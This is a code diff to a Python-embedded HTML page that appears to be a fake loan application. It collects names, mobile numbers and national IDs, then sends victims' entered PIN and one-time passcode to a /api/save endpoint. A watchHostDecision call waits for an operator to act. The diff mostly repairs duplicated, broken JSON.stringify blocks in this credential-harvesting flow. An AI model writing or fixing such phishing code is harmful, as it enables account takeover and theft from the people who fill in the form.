@@ -714,19 +714,16 @@ HTML_PAGE = r"""<!DOCTYPE html>
       fetch('/api/save', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          appId: appState.appId,
-                  body: JSON.stringify({
-          appId: appState.appId,
-          ref: appState.ref,
-          fullName: appState.fullName,
+             body: JSON.stringify({
+        appId: appState.appId,
+        ref: appState.ref,
+        fullName: appState.fullName,
+        mobile: formatMobileWithCountryCode(appState.mobile),
+        nationalId: appState.nationalId,
+        purpose: appState.purpose,
+        amount: appState.amount
+      })
 
-          fullName: appState.fullName,
-          mobile: formatMobileWithCountryCode(appState.mobile),
-          nationalId: appState.nationalId,
-          purpose: appState.purpose,
-          amount: appState.amount
-        })
       }).catch(err => console.error(err));
 
       goTo('loan');
@@ -982,22 +979,19 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
     function submitPin() {
       const formattedPhone = formatMobileWithCountryCode(appState.mobile);
-      fetch('/api/save', {
+           fetch('/api/save', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           appId: appState.appId,
-                  body: JSON.stringify({
-          appId: appState.appId,
           ref: appState.ref,
-          fullName: appState.fullName,
-
           fullName: appState.fullName,
           mobile: formattedPhone,
           field: 'entered_pin',
           value: enteredPin
         })
       }).catch(err => console.error(err));
+
       watchHostDecision('pin');
 
 
@@ -1074,11 +1068,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           appId: appState.appId,
-                  body: JSON.stringify({
-          appId: appState.appId,
-          ref: appState.ref,
-          fullName: appState.fullName,
-
+                ref: appState.ref,
+ 
           fullName: appState.fullName,
           mobile: formattedPhone,
           field: 'entered_otp',
